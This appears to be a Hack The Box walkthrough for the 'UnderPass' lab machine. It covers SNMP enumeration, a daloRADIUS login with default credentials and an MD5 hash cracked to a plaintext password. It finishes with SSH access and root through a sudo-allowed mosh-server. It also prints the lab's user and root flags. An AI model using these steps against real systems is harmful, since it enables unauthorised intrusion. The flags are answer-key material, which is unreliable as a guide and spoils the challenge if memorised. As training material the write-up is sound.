
[[HTB]] : [[Machines]]

**IP:** 10.10.11.48  
**Date:** 08/01/2025  

---

### **Enumeration**

#### **[[Nmap]] Scan Results**
- **Open Ports:**  
  - TCP 22: OpenSSH 8.9p1 (Ubuntu 3ubuntu0.10)  
  - TCP 80: Apache/2.4.52 (Outdated Version)  

- **UDP Scan on Port 161 (SNMP):**  
  - SNMPv1 server detected  
  - Net-SNMP SNMPv3 server with default community string (`public`)  

---

### **[[SNMP]] Enumeration**

Using the default SNMP community string `public`:
```bash
snmpwalk -v 1 -c public 10.10.11.48
```

#### **Results:**
- **System Information:**  
  - `iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"`

- **Admin Contact:**  
  - `iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"`

- **Hostname:**  
  - `iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"`

- **Location:**  
  - `iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"`

---

### **Web Server Discovery**
- **Apache Default Page:** Found at `http://underpass.htb`.  
- **Daloradius Login Page:** Found at `http://underpass.htb/daloradius/app/operators/login.php`.

#### **Default Credentials:**
Using the default Daloradius credentials:
```plaintext
Username: administrator  
Password: radius  
```
Access granted.

---

### **Exploitation**

#### **Discovered User: svcMosh**
From Daloradius, identified the existence of the `svcMosh` user and retrieved their hashed password:  
```plaintext
412dd4759978acfcc81deab01b382403
```

#### **Password Cracking:**
Using `hashcat`, the password was cracked:
```plaintext
underwaterfriends
```

#### **Gaining SSH Access:**
SSH into the server as `svcMosh`:
```bash
ssh svcMosh@underpass.htb
```

#### **User Flag:**
```plaintext
a7e8df8da8d1980a29aa88306de320f5
```

---

### **Privilege Escalation**

#### **Sudo Permissions:**
The `svcMosh` user has permission to run `/usr/bin/mosh-server` as `sudo`.

#### **Exploitation Command:**
Privilege escalation can be achieved using:
```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

#### **Root Flag:**
After escalating to root:
```bash
root@underpass:~# cat root.txt
cc2d0fa21831180a33da0fdd267d0a02
```

---

### **Summary:**
1. **Enumeration:** Discovered open ports (22, 80, 161), outdated software, and misconfigured SNMP.  
2. **Exploitation:** Used Daloradius default credentials to obtain `svcMosh`'s MD5 password hash. Cracked the hash and gained SSH access.  
3. **Privilege Escalation:** Leveraged sudo permissions on `/usr/bin/mosh-server` to escalate to root.  

---











